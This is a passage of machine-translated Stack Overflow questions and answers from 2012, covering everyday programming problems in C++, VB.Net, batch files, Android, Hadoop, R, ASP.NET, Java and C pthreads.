> 标签：c++, stl, map, max

我有一张地图：

```
typedef map<string, float> my_map;
my_map maxmap; 
```

我正在尝试找到最大浮点值及其相应的字符串键。这就是我找到最大浮点值的方式，但我遇到了分段错误，也不知道如何找到相应的字符串键。

```
float max = *(max_element(&(maxmap.begin()->second), &(maxmap.end()->second))); 
```

非常感谢！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:06:51.803

以下函数调用中的参数不是迭代器：

```
float max = *(max_element(&(maxmap.begin()->second), &(maxmap.end()->second))); 
```

相反，使用带有三个参数的函数，传递两个迭代器和一个比较对象，它只比较值，即：

```
struct LessBySecond
{
    template <typename Lhs, typename Rhs>
    bool operator()(const Lhs& lhs, const Rhs& rhs) const
    {
        return lhs.second < rhs.second;
    }
};

std::max_element(maxmap.begin(), maxmap.end(), LessBySecond()); 
```

该函数返回一个迭代器，该迭代器指向具有最大值的元素。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T21:53:24.903

另一种方法是使用来自 boost 或 c++11 的绑定和映射 value_type。我必须说这很难读。

```
my_map::iterator iter = 
  max_element( maxmap.begin(), maxmap.end(),
               bind(less<float>(),
                    bind(&my_map::value_type::second, placeholders::_1),
                    bind(&my_map::value_type::second, placeholders::_2)) ); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-25T20:07:48.857

的参数`max_element`必须是迭代器。`maxmap.begin()`是一个迭代器，但`&maxmap.begin()->second`不是。您不知道这些浮点数存储在内存中的什么位置，并且它们肯定不会连续存储在内存中，因此您可以使用`float *`.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-25T20:08:53.067

您没有`max_element`按应有的方式使用。

在您的代码中，`maxmap.begin()`是 a `map<string, float>::iterator`，所以`maxmap.begin()->second`实际上是 a `float`！

函数`max_element`抛出，因为你给它两个`floats`不是迭代器的引用。

要解决您的问题，您应该编写一个`Comparator`，然后使用

```
Comparator myComp;
float max = max_element(maxmap.begin(), maxmap.end(), myComp)->second; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T20:12:42.203

`maxmap.end()->second`<-- 您在这里尝试做的是取消引用无效的结束迭代器。

**只需使用 for 循环**：

```
typedef my_map::iterator iter;
iter it = maxmap.begin();
iter end = maxmap.end();

float max_value = it->second;
std::string str = it->first;
for( ; it != end; ++it) {
    if(*it->second > max_value) {
        max_value = it->second;
        str = it->first;
    }
} 
```

# c++ - 如何在 Visual Studio 2012 C++ 项目中引用（动态库）DLL？

> ID：13076318
> 
> 赞同：4
> 
> 时间：2012-10-25T20:01:19.063
> 
> 标签：c++, visual-studio-2012

我制作了一个带有编译头文件的动态库并编译了一个 DLL（使用 Visual Studio 2012）。

我还有一个使用 Visual Studio 2012 制作的 C++ 项目，我想引用之前生成的 DLL。

如何在我的 Visual Studio 2012 C++ 项目中引用该（动态库）DLL？如果我想使用库的功能，是否还需要指向头文件（.h）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:07:38.833

`Framework and References`我发现使用项目属性对话框中的项目引用 DLL 项目最容易：

![在此处输入图像描述](../Images/893bcb3a8011d5ac6d38cd73d9c2cb81.png)

看起来您正在将一些奇怪的 .Net 东西添加到您的 C++ 本机代码中，但这也是本机代码项目引用另一个项目的最简单方法。

如果您想调用该 DLL 中的函数，那么是的，您可能希望包含该 DLL 的头文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:33:27.940

有几种方法可以做到这一点，但都有一个共同点，即您需要在项目中包含标头，以便知道这些函数，因为 C++ 没有反射。

1.  您可以跳过静态链接并使用 LoadLibrary 加载 dll 并使用 GetProcAddress 获取函数，这样做的好处是您可以使 DLL 成为可选。如果它不存在，您可以避免调用它或提供一些用户友好的错误消息。

2.  您可以静态链接到 dll，这意味着将 dll 的 .lib 文件添加到您的项目中，有几种方法可以做到这一点，老派的方法是将它添加到您的解决方案/链接器/输入/附加的属性中依赖项，然后确保 dll 在 exe 搜索路径中。如果未找到，您将收到一条错误消息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:10:06.220

您可以在此处查看文档：http: [//msdn.microsoft.com/en-us/library/ms235636](http://msdn.microsoft.com/en-us/library/ms235636(v=vs.80).aspx) (v=vs.80).aspx （创建和使用动态链接库）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-03-25T11:52:18.863

我可以给你一个关于如何在 VS 2010 中添加 dll 的答案

步骤：右键单击解决方案资源管理器，属性，配置属性，常规，输出目录。在这里按右箭头并选择眉毛。浏览到 DLL 目录。

就这样。

# vb.net - 选择公式的结果必须是布尔值

> ID：13076319
> 
> 赞同：0
> 
> 时间：2012-10-25T20:01:23.407
> 
> 标签：vb.net, stored-procedures

使用 VB.Net

像这样的存储过程

```
@Orderno nvarchar(1000)

Select * from table1 where id = ''+@orderno+'' 
```

在 VB.Net 代码中

```
Dim value as string
Value = "1"
    objForm.ViewReport(myReportPath & "rOrder.rpt", "value") `' Showing error on this line` 
```

我试过了`'"& value &"', "value"`，同样的错误

我尝试使用 "" & value & "" 将错误显示为`the remaining text does not appear to be part of the formula`

如何正确地将字符串传递给存储过程

需要 Vb.Net 代码帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:19:48.433

问题真的不清楚，我看不到对存储过程的调用，但是如果你想通过参数传递一个变量，只需去掉引号：

```
Dim value as string = "1"
objForm.ViewReport(myReportPath & "rOrder.rpt", value) 
```

# for-loop - Notepad++ 批量格式化

> ID：13076329
> 
> 赞同：1
> 
> 时间：2012-10-25T20:02:14.580
> 
> 标签：for-loop, batch-file, formatting, notepad++

我正在尝试进行简单的批处理以在文件夹中搜索包含用户提示名称的文件夹，如果找到该文件夹​​，它将询问是否应将文件夹复制到预定义的位置。当我在 cmd 中单独键入这些行时，它们工作正常，但是当我尝试将其保存在批处理文件中并运行它时，它会在 SET 之后以某种方式关闭 for do 中的某个位置，所以我怀疑它有什么要我的 FOR 在 Notepad++ 中如何格式化？

```
:START
    set /p nw=Please enter the search string: 

    FOR /f "tokens=*" %%i IN ('dir /a:d-s-h /b ^| findstr /i /m "%nw%"') do (
        echo found %%i &&echo.
        set /p cflag=Would you like to copy this folder over? Press 'y' and enter: 
        if %cflag%==y xcopy "%%i" "%sci%" /e
    )

set /p rflag=Search for another folder? Press 'y' and enter: 
if %rflag%==y goto START 
```

这将在 XP 上运行。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:27:48.493

跟notepad++无关，关键字是延迟扩展。

%cflag% 将在解析 for 块时扩展，然后执行块中的任何行。
因此它仍然是空的，并且它扩展为空。
然后 if 子句的语法无效。

但是您可以通过延迟扩展来解决它。
只需将其放在批次的开头即可。

```
Setlocal EnableDelayedExpansion 
```

然后扩展你的变量

```
!cflag! 
```

# android - 可以更改主题的某些方面（颜色）

> ID：13076330
> 
> 赞同：2
> 
> 时间：2012-10-25T20:02:18.907
> 
> 标签：android, user-interface, themes

**我的问题：**是否可以仅更改 Android 应用程序标准主题的一部分？具体来说，我问的是颜色。

**我的情况：**我正在使用`Holo.Light.DarkActionBar`主题（但这个问题比主题本身更笼统。我真的很喜欢Android的蓝色主题，但我想知道是否可以将主题改为橙色。也许我可以说明...

![像这样的东西...](../Images/106e990c1bb8bf3d51bd8867f9702865.png)

在不重写主题的情况下这可能吗？我意识到我可能无法更改通知栏的颜色，这没关系。我只关心我的应用程序的主题，而不是系统。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:27:08.583

如果不创建自定义主题，您将无法做到这一点，但使用[Android 资源工作室中的](http://android-ui-utils.googlecode.com/hg/asset-studio/dist/index.html)[Android Holo Colors](http://android-holo-colors.com/)和其他工具，大部分工作将为您完成。只需选择您想要的颜色和您想要样式的 UI 元素，它就会生成您项目所需的资源。

# hadoop - Hadoop 自定义分区问题

> ID：13076331
> 
> 赞同：1
> 
> 时间：2012-10-25T20:02:25.240
> 
> 标签：hadoop, mapreduce, partitioner

根据自定义分区程序的“getPartition”方法的输出，我遇到了一个自定义中间键没有出现在我期望的分区中的问题。我可以在我的映射器日志文件中看到分区器生成预期的分区号，但是有时具有公共分区号的键不会在同一个减速器中结束。

具有公共“getPartition”输出的键如何在不同的减速器中结束？

我在映射器日志文件中注意到，在对自定义中间键“hashCode”和“compareTo”方法进行了多次调用之后，所有“getPartition”调用都被调用了。映射器只是在分区排序中进行还是可能是问题的一部分？

我附上了自定义中间键和分区器的代码。注意：我确切知道 1/2 的键将“useBothGUIDFlag”设置为 true，而 1/2 的键将此设置为 false（这就是为什么我将这些键分区为分区空间的一半）。我也知道键似乎没有跨入分区的另一半​​（即，“useBothGUIDFlag”键不会出现在“！useBothGUIDFlag”分区中，反之亦然），而是它们在它们的一半内混合分区。

```
public class IntermediaryKey implements WritableComparable<IntermediaryKey> {

    public String guid1;
    public String guid2;
    public boolean useBothGUIDFlag;

    @Override
    public int compareTo(IntermediaryKey other) {
        if(useBothGUIDFlag)
        {
            if(other.useBothGUIDFlag)
            {
                return this.hashCode() - other.hashCode();
            }else{
                return 1;
            }
        }else{
            if(!other.useBothGUIDFlag)
            {
                return guid2.compareTo(other.guid2);
            }else{
                return -1;
            }
        }
    }

    @Override
    public int hashCode()
    {
        if(useBothGUIDFlag)
        {
            if(guid1.compareTo(guid2) > 0)
            {
                return (guid2+guid1).hashCode();
            }else{
                return (guid1+guid2).hashCode();
            }
        }else{
            return guid2.hashCode();
        }
    }

    @Override
    public boolean equals(Object otherKey)
    {
        if(otherKey instanceof IntermediaryKey)
        {
            return this.compareTo((IntermediaryKey)otherKey) == 0;
        }
        return false;
    }
}

public static class KeyPartitioner extends Partitioner<IntermediaryKey, PathValue>
{
    @Override
    public int getPartition(IntermediaryKey key, PathValue value, int numReduceTasks) {
        int bothGUIDReducers = numReduceTasks/2;
        if(bothGUIDReducers == 0)
        {
            return 0;
        }

        int keyHashCode = Math.abs(key.hashCode());
        if(key.useBothGUIDFlag)
        {
            return keyHashCode % bothGUIDReducers;
        }else{
            return (bothGUIDReducers + (keyHashCode % (numReduceTasks-bothGUIDReducers)));
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T17:33:14.580

问题最终出在自定义密钥（IntermediaryKey）的序列化/反序列化中。“useBothGUIDFlag”变量被读入与它应该是相反的。

在 reducer 中获取“mapred.task.partition”属性值有助于注意到发生了这种交换。然后，具有相反“useBothGUIDFlag”值的键似乎进入了正确的减速器。

# r - 对数据框的所有子集应用函数

> ID：13076333
> 
> 赞同：3
> 
> 时间：2012-10-25T20:02:30.263
> 
> 标签：r, subset, apply

如何按物种规范化 Sepal.Length 的值？

```
 iris
    Sepal.Length Sepal.Width Petal.Length Petal.Width    Species
1            5.1         3.5          1.4         0.2     setosa
...

# i have to divide by 
tapply(iris$Sepal.Length, iris$Species, max)
    setosa versicolor  virginica 
       5.8        7.0        7.9 
```

换句话说，我想将所有值`Species=="setosa"`除以 5.8，依此类推，最后我希望在 Sepal.Length 列中有一个标准化值为 0..1 的数据框。

最后它应该返回

```
 iris
    Sepal.Length Sepal.Width Petal.Length Petal.Width    Species
1      0.8793103         3.5          1.4         0.2     setosa
... 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T20:19:01.817

显然有很多方法可以做到这一点。我最喜欢`ave()`（参见 DWin 的答案）或`data.table`包的语法：

```
library(data.table)
dt <- data.table(iris)
dt[, Sepal.Length:=(Sepal.Length)/max(Sepal.Length), by="Species"]
dt
#      Sepal.Length Sepal.Width Petal.Length Petal.Width   Species
#   1:    0.8793103         3.5          1.4         0.2    setosa
#   2:    0.8448276         3.0          1.4         0.2    setosa
#   3:    0.8103448         3.2          1.3         0.2    setosa
#   4:    0.7931034         3.1          1.5         0.2    setosa
#   5:    0.8620690         3.6          1.4         0.2    setosa
# 146:    0.8481013         3.0          5.2         2.3 virginica
# 147:    0.7974684         2.5          5.0         1.9 virginica
# 149:    0.7848101         3.4          5.4         2.3 virginica
# 150:    0.7468354         3.0          5.1         1.8 virginica

df <- data.frame(dt) ## It's possible (but not necessary) to coerce back to
                     ## a plain old data.frame 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-25T20:20:20.227

我严格解释您除以最大值的愿望。

一种选择：

```
aggregate(iris$Sepal.Length,list(iris$Species),FUN = function(x) x/max(x)) 
```

另一个，使用`ddply`from **plyr**（并一次缩放所有列：

```
ddply(iris,.(Species),colwise(function(x){x / max(x)})) 
```

还有一个更像@Dwin`ave`示例的变体，它使其他列保持不变，但使用`ddply`：

```
ddply(iris,.(Species),transform,Sepal.Length = Sepal.Length / max(Sepal.Length)) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-25T20:27:08.227

```
 iris$ratio_to_max <- ave( iris$Sepal.Length, list(iris$Species), 
                                                     FUN= function(x) x/max(x))
#-------------
> str(iris)
'data.frame':   150 obs. of  6 variables:
 $ Sepal.Length: num  5.1 4.9 4.7 4.6 5 5.4 4.6 5 4.4 4.9 ...
 $ Sepal.Width : num  3.5 3 3.2 3.1 3.6 3.9 3.4 3.4 2.9 3.1 ...
 $ Petal.Length: num  1.4 1.4 1.3 1.5 1.4 1.7 1.4 1.5 1.4 1.5 ...
 $ Petal.Width : num  0.2 0.2 0.2 0.2 0.2 0.4 0.3 0.2 0.2 0.1 ...
 $ Species     : Factor w/ 3 levels "setosa","versicolor",..: 1 1 1 1 1 1 1 1 1 1 ...
 $ ratio_to_max: num  0.879 0.845 0.81 0.793 0.862 ... 
```

如果你想更换`Sepal.Length`柱子，你可以这样做，但我通常会避免这种破坏性的做法，直到我真的确定我得到了我想要的。（即使这样我也感到内疚。）如果你希望它在单独的列表“数据包”中并丢弃原来的“Sepal.Length”列，你可以使用`split`：

```
 spl.iris <- split(iris[-1], iris$Species)
 str(spl.iris) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:15:26.507

我确信有更好的 plyr 或数据表，甚至是基本方法：

```
L1 <- lapply(split(iris[, -5], iris$Species), function(x) apply(x, 2, scale))
L2 <- lapply(seq_along(L1), function(i) {
    data.frame(SPecies=names(L1)[i], L1[[i]])
})
do.call(rbind, L2) 
```

# c# - 将数据表中两列的数据与 ASP.NET C# 中的变量进行比较

> ID：13076336
> 
> 赞同：0
> 
> 时间：2012-10-25T20:02:30.983
> 
> 标签：c#, asp.net, session, datatable

**所以我正在练习使用带有 ASP.Net 的数据库......**

我有两个来自 Northwind 数据库的数据表列。一个是`Product.ProductID`，另一个是`Product.UnitsInStock`。我需要将其与对象集合（SortedList）进行比较。本质上是比较变量产品 ID 和数量（客户端）。对象是`ICollection`保存在 中的值`Session["cart"]`。

如何将我拥有的产品 id 和库存单位变量与 DataTable 列 1 是 Products.ProductID 和第二列是 Products.UnitsInStock 进行比较？

这是查询以及我认为我可以如何从数据库中获取这些变量的大致内容。

```
DataTable dt = new DataTable();

if (dt.Columns.Count != 0 &&
       dt.Rows.Count != 0)
    {
        int quantityOfUnit = 0;
        int productID = 0;
        for (int index = 0; index < dt.Columns.Count; index++)
        {
            if (index == indexOfUnitsInStock)//indexOfUnitsInStock = 1
            {
                quantityOfUnit = int.Parse(dt.Rows[0][index].ToString());
            }
            else//index = 0
            {
                productID = int.Parse(dt.Rows[0][index].ToString());
            }
        } 
```

建立一个新的查询：

```
foreach (object items in ((ShoppingCart)Session["cart"]).Values)
    {
        OleDbConnection conn = new OleDbConnection((string)Application["DBConnectionString"]);
    string selectionString =
        "SELECT Products.ProductID, Products.UnitsInStock " +
            "FROM Products" +
            "WHERE Products.ProductID = " +
            ((ShoppingCart)Session["cart"]).Values;
    DataTable dt = new DataTable();
    try
    {
        OleDbCommand cm = new OleDbCommand(selectionString, conn);
        OleDbDataAdapter da = new OleDbDataAdapter();
        da.SelectCommand = cm;   
        da.Fill(dt);
        da.Dispose();
    }
    catch(Exception ex)
    {
        txtUnderstockedItems.Text = "There was a problem connecting to the database: " + ex.Message ;
    }
    finally
    {
        conn.Close();
    }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:12:21.963

首先，您通常不希望以您正在做的方式连接 SQL。使用[参数化 SQL](http://software-security.sans.org/developer-how-to/fix-sql-injection-microsoft-.net-with-parameterized-queries)。如果这些是整数值，您可以将它们转换为整数，然后将它们放入查询中并获得类似的结果。

如果 ShoppingCart.Values 是一个集合，那么您有几个选择。

1.  针对 Values 中的每个项目，一次发出一个查询
2.  构建一个使用 sql 列表“WHERE Products.ProductID IN (1, 2, 3, 4)”的查询 - 您将通过迭代值构建的列表
3.  创建一个执行查询并使用 XML[参数](http://weblogs.asp.net/jgalloway/archive/2007/02/16/passing-lists-to-sql-server-2005-with-xml-parameters.aspx)提供列表值的存储过程。

在这 3 个中，我更喜欢第 3 个，因为它更安全，并且从长远来看可能更容易维护。

＃1的一个例子是这样的......

```
foreach (object obj in (ShoppingCart)Session["cart"].Values)
{
  DataTable dt = new DataTable();
  int productID = (int)obj;
  string query = "SELECT * FROM Products WHERE ProductID = ?";   //yuck, oledb params
  using (OleDbConnection conn = new OleDbConnection (connStr))
  {
     //dont hold me to this syntax, its from my head
     OleDbCommand cmd = new OleDbCommand(query, conn);
     cmd.Parameters.Add(productID);
     OleDbDataAdapter da = new OleDbDataAdapter();
     da.SelectCommand = cm;   
     da.Fill(dt);
  }
  //do something with the data table
} 
```

# java - 在 Java 文本区域中格式化输出

> ID：13076341
> 
> 赞同：1
> 
> 时间：2012-10-25T20:02:47.207
> 
> 标签：java, mysql, user-interface, formatting, output

我正在控制台中打印来自 MySQL 查询的输出，并打印到我的 gui 应用程序的文本区域中。现在，只要名称长于其列的宽度，文本区域中的列就会变得混乱。如何修复下面的代码段以使文本区域的输出看起来一致？

```
else if (e.getSource() == executeButton) {
    //Create a statement
    try{
        String commandString = enterSQLText.getText();
        Statement statement = conn.createStatement();
        //Execute a statement
        ResultSet resultSet = statement.executeQuery(commandString);
        //Process query results
        ResultSetMetaData metaData = resultSet.getMetaData();
        int numberOfColumns = metaData.getColumnCount();

        for(int i = 1; i<= numberOfColumns; i++){
            executionResultText.append(metaData.getColumnName(i) + "\t");
            System.out.printf("%20s\t", metaData.getColumnName(i));
        }
        executionResultText.append("\n");
        System.out.println();

        while (resultSet.next()){
            for (int i = 1; i <= numberOfColumns; i++){
                executionResultText.append(resultSet.getObject(i).toString() + "\t");
                System.out.printf("%20s\t", resultSet.getObject(i));
            }
            executionResultText.append("\n");
            System.out.println();
        }
        System.out.println("Execute Button Works!");
    }
    catch (Exception h){
        h.printStackTrace();
    }
} 
```

我很感激帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:20:14.803

最好使用其中一台 Logger 为您进行格式化。如果不使用某种文本格式库，很难在控制台中控制制表符间距和垂直列对齐。记录器可以选择将您的输出存储在您可以用来查看的文本文件中。它也可以很好地格式化输出。

这是最受欢迎的记录器：

[http://www.slf4j.org/](http://www.slf4j.org/)

如果必须自己输出到控制台，则需要使用控制台输出库。看看这个，看起来很有希望：

[http://www.codeproject.com/Articles/24896/JLib-A-Windows-Console-Library](http://www.codeproject.com/Articles/24896/JLib-A-Windows-Console-Library)

# java - 从桌面应用程序使用 Java 发布表单

> ID：13076351
> 
> 赞同：0
> 
> 时间：2012-10-25T20:03:20.077
> 
> 标签：java, forms, post

我想将数据发布到我拥有的网站上的 html 表单中。到目前为止，我正在测试它：

```
HttpClient httpClient = new HttpClient();
                PostMethod postMethod = new PostMethod("website URL");
                postMethod.addParameter("company_label", customerCompany);
                postMethod.addParameter("customer_name_label", customerName);
                try {
                    httpClient.executeMethod(postMethod);
                } catch (HttpException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (postMethod.getStatusCode() == HttpStatus.SC_OK) {
                    String resp = postMethod.getResponseBodyAsString();
                } else {
                     //...postMethod.getStatusLine();
                } 
```

但它会抛出这个错误

```
Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory
    at org.apache.commons.httpclient.HttpClient.<clinit>(HttpClient.java:66)
    at main.main(main.java:113)
Caused by: java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source) 
```

我是在正确的道路上做我想做的事，还是应该以不同的方式做这件事？

我尝试使用的表格看起来像

```
<form name ='XXXXXXX' method='post' onSubmit='return validate_b3cdee6457e94aae9dee29379f9b9470()'>
  <input type='hidden' name='done' value='XXXX' border='0'>
  <input type='hidden' name='version' value='2' border='0'>
  <table border='0' cellspacing='1' cellpadding='2' width='50%' >
    <tr>
      <td><table border='0' cellspacing='1' cellpadding='2' width='50%' >
          <tr>
            <td class='DarkText' style='color:red'><div id='XXXXXXXX' style='display:none;'></div></td>
          </tr>
        </table>
        <div id='div_webForm_b3cdee6457e94aae9dee29379f9b9470'>
          <table border='0' cellspacing='1' cellpadding='2' width='100%' >
            <tr valign='top' id='text_field_row_company' >
              <td  style=''  width='20%' id="company_label"  nowrap class='FormLabel' >Company</td>
              <td class='FormField'      ><input id="company" type='text' name='company' size='30' maxlength='255' class='inputForm'  value=""       ></td>
            </tr>
            <tr valign='top' id='text_field_row_customer_name' >
              <td  style=''  width='20%' id="customer_name_label"  nowrap class='FormLabel' >Customer Name</td>
              <td class='FormField'      ><input id="customer_name" type='text' name='customer_name' size='30' maxlength='255' class='inputForm'  value=""       ></td>
            </tr>
            <tr valign='top' id='text_field_row_phone' >
              <td  style=''  width='20%' id="phone_label"  nowrap class='FormLabel' >Phone</td>
              <td class='FormField'      ><input id="phone" type='text' name='phone' size='30' maxlength='255' class='inputForm'  value=""       ></td>
            </tr>
            <tr valign='top' id='text_field_row_email' >
              <td  style=''  width='20%' id="email_label"  nowrap class='FormLabel' >Email</td>
              <td class='FormField'      ><input id="email" type='text' name='email' size='30' maxlength='255' class='inputForm'  value=""       ></td>
            </tr>
            <tr valign='top' id='text_field_row_needs' >
              <td  style=''  width='20%' id="needs_label"  nowrap class='FormLabel' >Needs</td>
              <td class='FormField'      ><input id="needs" type='text' name='needs' size='30' maxlength='255' class='inputForm'  value=""       ></td>
            </tr>
            <tr valign='top' id='field_row_id_other_needs'  >
              <td    style='' width='20%' height=28px nowrap class='FormLabel'  id='field_cell_label_id_other_needs' >Other Needs</td>
              <td     class='FormField'  id='field_cell_value_id_other_needs'  ><textarea id='other_needs' name='other_needs' rows='5' cols='30'  class='inputForm'   ></textarea></td>
            </tr>
            <tr>
              <td></td>
              <td><input type='submit' name='submitButtonName' value='Submit' border='0' ></td>
            </tr>
          </table>
        </div></td>
    </tr>
  </table>
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:08:56.770

是的。HTTPClient 代码正在尝试使用来自其他地方的代码......来自 Apache 日志记录的东西。您需要将该 JAR 包含到您的类路径中（在 Eclipse 中，它位于 Project Properties->Java Build Path:Libraris 选项卡中。

请参阅：[获取 java.lang.ClassNotFoundException：org.apache.commons.logging.LogFactory 异常](https://stackoverflow.com/questions/1551697/getting-java-lang-classnotfoundexception-org-apache-commons-logging-logfactory)

和别的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:09:09.650

您可能会错过 lib 文件夹中相关的 jar 文件：

在这里下载： http: [//commons.apache.org/logging/download_logging.cgi](http://commons.apache.org/logging/download_logging.cgi)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:10:07.353

它抱怨 Appache Commons Library。请 `commons-logging.xxxxxx.jar`从[**Apache commons 下载**](http://commons.apache.org/logging/download_logging.cgi)并添加到您的项目 lib/classpath 中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T20:26:09.160

你的代码和我一起工作正常，有 3 个 jars 和 Open JDK 1.6

```
commons-httpclient-3.1.jar
commons-logging/1.0.4/commons-logging-1.0.4.jar
commons-codec/1.2/commons-codec-1.2.jar 
```

我已经测试过：

```
PostMethod method = new PostMethod("http://search.yahoo.com/search"); 
```

祝你好运！

# asp.net-mvc - 如何从asp.net mvc中的注册路由中获取字符串url？

> ID：13076353
> 
> 赞同：0
> 
> 时间：2012-10-25T20:03:33.930
> 
> 标签：asp.net-mvc, asp.net-mvc-routing

在 Global.asax 中，我们使用以下方法注册路由：

```
MapRoute(this System.Web.Routing.RouteCollection routes, 
    string name, 
    string url, 
    object defaults, 
    string[] namespaces) 
```

有没有办法`string url`从代码中检索？具体来说，我有兴趣从注册路由的 url 中获取路由段，如下所示：

```
"customRoutePrefix/{controller}/{action}/{id}" 
```

我需要查找“customRoutePrefix”或任何已注册路由的等效项。

我想我也许可以`System.Web.Routing.RouteTable.Routes`用来做这个，但我还没有在那里找到它。

这可能吗/我应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:07:37.290

是的。

您可以使用：

```
this.RouteData.Values["segment name"] 
```

例如，

```
this.RouteData.Values["controller"]; 
```

### 编辑 1

这段代码将完成检索所有已注册路由 URL 的技巧

```
var res = new List<string>();

foreach (var item in RouteTable.Routes)
{
    var r = (Route)item;

    res.Add(r.Url);
}

this.ViewBag.Res = res; 
```

在您看来：

```
@foreach (var item in this.ViewBag.Res)
{
    <div>@item</div>
} 
```

结果：

```
Chapter14/{controller}/{action}/{id}
Movies/{controller}/{action}/{id}
api/{controller}/{id}
{resource}.axd/{*pathInfo}
{resource}.svc/{*pathInfo}
{controller}/{action}/{id}
wcf/{*pathInfo} 
```

# c# - Global.asax.cs 的路由集合中抛出异常

> ID：13076354
> 
> 赞同：0
> 
> 时间：2012-10-25T20:03:47.613
> 
> 标签：c#, asp.net-mvc, exception, routes

我一直在关注[ASP.NET](http://www.asp.net/mvc/tutorials/mvc-music-store)上出色的 MVC 音乐商店教程。一切都很顺利，直到我遇到了这个未处理的异常：

> 名为“默认”的路由已在路由集合中。路由名称必须是唯一的。参数名称：名称

抛出异常时突出显示以下代码：

```
routes.MapRoute(
     "Default", // Route name
     "{controller}/{action}/{id}", // URL with parameters
      new { controller = "Home", action = "Index", id = UrlParameter.Optional } // Parameter defaults
); 
```

我根本没有修改上面的代码。我对全局文件所做的唯一更改是在 Applicatio_Start 中包含一些代码，该代码告诉实体框架有关包含示例数据的 .cs 类。

我不知道为什么会发生这种情况，而且，当我在做一个教程时，MVC 对我来说显然是新的。如果有人能解决这个问题，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:08:40.210

您必须有另一条名为“默认”的路线

或者您可能正在注册您的路线两次。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:10:21.797

您可能在 . 中调用`RegisterRoutes`了两次`Application_Start`。

# objective-c - 在 tabBarController 中的 UIViewController 上调用实例方法

> ID：13076362
> 
> 赞同：1
> 
> 时间：2012-10-25T20:04:32.260
> 
> 标签：objective-c, ios, ios5

我通过 XCode 4.5.1 中的模板创建了一个简单的 Tab Bar 应用程序，它在 app_delegate 中为我提供了两个这样的视图控制器：

```
self.tabBarController = [[UITabBarController alloc] init];
self.tabBarController.viewControllers = @[viewController1, viewController2];
self.window.rootViewController = self.tabBarController; 
```

在 viewController1 中，我有一个实例方法，可以写出一些登录/注销按钮。其中一个回调在 app_delegate 中，并且想要调用 viewController1 中的实例方法。我试过这个：

```
[[self.tabBarController.viewControllers objectAtIndex:0 ] renderButton]; 
```

但它不起作用。这种类型的查询是可能的还是我应该使用其他技术？

提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:15:51.050

你写的应该有效。不需要强制转换（尽管它确实使代码更具可读性）。如果您确定`renderButton`没有被调用（在此方法中放置断点或 NSLog 消息），我的猜测是您忘记在 FirstViewController 的头文件中声明它。

```
@interface FirstViewController : UIViewController
-(void)renderButton;
@end 
```

# c - 如何使用 2 个线程同时读取/写入文件？

> ID：13076363
> 
> 赞同：0
> 
> 时间：2012-10-25T20:04:36.717
> 
> 标签：c, file-io, pthreads

我有一个服务器/客户端应用程序，有 2 个不同的版本。在第一个客户端读取一个文本文件并将文本数据发送到服务器，服务器将接收到的数据写入一个新的文本文件（“received.txt”），并且当它完成写入时，它将文本文件打印到屏幕上。

在第二个版本中，客户端做同样的事情，但我希望服务器在写入文件“received.txt”的同时将数据打印到屏幕上。你可能想知道我为什么要做这样的事情。我想加快写入文件并将文件打印回屏幕的过程。如果我使用 2 个线程，我可能会加快工作速度。

我遇到了一个问题，（这是我第一次使用pthreads）。服务器在将数据打印到屏幕之前终止。我认为这是关于调度的。当新创建的线程正在运行并且主线程被阻塞时，该文件没有可读取的内容，然后新创建的线程终止。这就是我对这个问题的猜测。如果可能的话，我想在这里实现的是同时进行读/写。如果我做错了，或者我不能用线程同时读/写，请告诉我:)

这是服务器（第二版）：

```
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <time.h>

void error(char *msg) {
  perror(msg);
  exit(1);
}

//New Thread function
void *printData() {
  FILE *fp = fopen("received.txt" , "r");
  char buffer;

  time_t time1 = time(NULL);

  if( fp != NULL ) {
    while( ( buffer = fgetc(fp)) != NULL ) {
      printf("%c" , buffer);
    }
    fclose(fp);
  }

  time_t time2 = time(NULL);
  double diff = difftime(time2 , time1);
  printf("It took %.lf seconds.\n" , diff);
  pthread_exit(NULL);
}  

int main(int argc , char *argv[]) {
